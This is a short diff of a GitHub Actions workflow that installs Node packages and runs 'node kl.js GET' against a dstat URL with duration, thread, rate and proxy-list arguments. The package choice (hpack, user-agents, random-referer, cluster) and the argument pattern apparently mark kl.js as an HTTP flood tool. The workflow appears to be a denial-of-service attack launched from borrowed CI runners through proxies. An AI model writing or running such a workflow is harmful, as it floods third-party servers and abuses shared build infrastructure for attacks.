@@ -37,7 +37,7 @@ jobs:
       
       - name: Install Node.js dependencies
         run: |
-          npm install puppeteer-real-browser fingerprint-generator colors chalk@4 user-agents random-referer cluster request
+          npm install hpack colors chalk@4 user-agents random-referer cluster request
 
 
       
@@ -47,7 +47,7 @@ jobs:
           
           unzip Fc-main.zip
           cd Fc-main
-          node kl.js GET https://c1.dstatbot.win/WYrmJ2de 700 4 120 proxy.txt
+          node kl.js GET https://c1.dstatbot.win/a5wDn7aL 700 4 120 proxy.txt
           
           
           
